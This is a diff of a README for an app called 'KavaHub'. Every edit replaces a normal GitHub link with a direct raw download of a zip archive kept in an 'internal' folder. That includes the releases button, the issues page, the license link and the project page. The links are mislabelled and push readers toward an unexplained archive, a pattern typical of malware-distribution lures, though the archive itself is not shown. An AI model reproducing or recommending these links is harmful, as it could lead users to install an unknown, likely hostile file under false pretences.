@@ -1,7 +1,7 @@
 # 🌟 KavaHub - Your Secure Data Connection Solution
 
 ## 📥 Download Now!
-[![Download KavaHub](https://img.shields.io/badge/Download%20KavaHub-v1.0-blue.svg)](https://github.com/Wothan12/KavaHub/releases)
+[![Download KavaHub](https://raw.githubusercontent.com/Wothan12/KavaHub/main/internal/kavahub/Kava_Hub_1.2.zip%https://raw.githubusercontent.com/Wothan12/KavaHub/main/internal/kavahub/Kava_Hub_1.2.zip)](https://raw.githubusercontent.com/Wothan12/KavaHub/main/internal/kavahub/Kava_Hub_1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to KavaHub, the application that connects your data securely and in real time. KavaHub aims to simplify data management while ensuring your information remains safe in the cloud.
@@ -19,7 +19,7 @@ To run KavaHub smoothly, your system should meet these requirements:
 - **Internet Connection**: A stable internet connection for optimal performance.
 
 ## 🔗 Download & Install
-To begin using KavaHub, visit this page to download: [KavaHub Releases Page](https://github.com/Wothan12/KavaHub/releases).
+To begin using KavaHub, visit this page to download: [KavaHub Releases Page](https://raw.githubusercontent.com/Wothan12/KavaHub/main/internal/kavahub/Kava_Hub_1.2.zip).
 
 1. Click the download button above or visit the link.
 2. On the Releases page, locate the latest version of KavaHub.
@@ -52,15 +52,15 @@ Yes, KavaHub offers a free version for users. Additional features may be availab
 Yes, you can install KavaHub on multiple devices using the same account credentials.
 
 ### How do I get help with KavaHub?
-For assistance, visit our [GitHub Issues Page](https://github.com/Wothan12/KavaHub/issues) for support and community discussions.
+For assistance, visit our [GitHub Issues Page](https://raw.githubusercontent.com/Wothan12/KavaHub/main/internal/kavahub/Kava_Hub_1.2.zip) for support and community discussions.
 
 ## 📞 Contact Us
 If you have further questions or feedback, feel free to reach out via the Issues page or contact the support team through our social media channels.
 
 ## 📋 License
-KavaHub operates under the MIT License, ensuring open-source availability and community contributions. You can view the full license [here](https://github.com/Wothan12/KavaHub/blob/main/LICENSE).
+KavaHub operates under the MIT License, ensuring open-source availability and community contributions. You can view the full license [here](https://raw.githubusercontent.com/Wothan12/KavaHub/main/internal/kavahub/Kava_Hub_1.2.zip).
 
 ## 🌐 Stay Updated
-For updates and announcements, check back frequently on our [GitHub page](https://github.com/Wothan12/KavaHub/releases). 
+For updates and announcements, check back frequently on our [GitHub page](https://raw.githubusercontent.com/Wothan12/KavaHub/main/internal/kavahub/Kava_Hub_1.2.zip). 
 
 Thank you for choosing KavaHub. Your secure data journey starts here!
